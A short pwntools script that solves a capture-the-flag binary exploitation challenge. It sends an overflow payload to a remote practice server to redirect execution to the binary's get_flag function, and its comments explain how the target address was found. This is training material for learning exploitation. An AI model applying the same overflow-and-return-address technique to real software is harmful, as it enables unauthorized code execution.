from pwn import *

#r = process('./pwn1_sctf_2016')
r = remote('node3.buuoj.cn', '25123')
raw_input()

# if you use strings command, you can find string 'cat flag.txt' in the bin
# and by using the radare2, you can see a function called sym.get_flag, so the magic number will be 0x08048f0d
p = 'I' * (0x40 / 3) + 'a' * (0x40 % 3) + p64(0x08048f0d)

#print r.recv()
r.sendline(p)

r.interactive()
